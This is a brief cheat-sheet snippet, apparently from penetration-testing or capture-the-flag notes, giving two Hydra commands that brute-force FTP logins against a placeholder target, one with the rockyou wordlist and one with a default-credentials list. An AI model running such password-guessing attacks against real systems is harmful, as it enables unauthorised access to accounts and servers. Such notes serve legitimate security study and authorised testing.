> If you have a username already:

```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <target ip> ftp
```

> If you want to try default credentials:

```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<target ip>
```

